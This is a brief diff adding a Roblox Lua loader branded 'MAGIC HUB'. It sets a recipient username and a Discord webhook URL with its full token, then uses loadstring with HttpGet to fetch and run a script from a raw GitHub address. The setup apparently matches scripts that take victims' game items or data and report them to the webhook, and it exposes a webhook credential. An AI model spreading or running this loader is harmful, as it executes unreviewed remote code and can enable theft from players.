@@ -1,0 +1,5 @@
+G.Username "just_4196"
+G.Hublane "MAGIC HUB" 
+G.WebhookUrl"https://discord.com/api/webhooks/1122798790965989428/3F10N9e67l6uylWTgzAh6g1ngBw0853AsdGIBVAIX3gFVlRswN3sp2Fgy_rIWYg-IHQZ"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))().
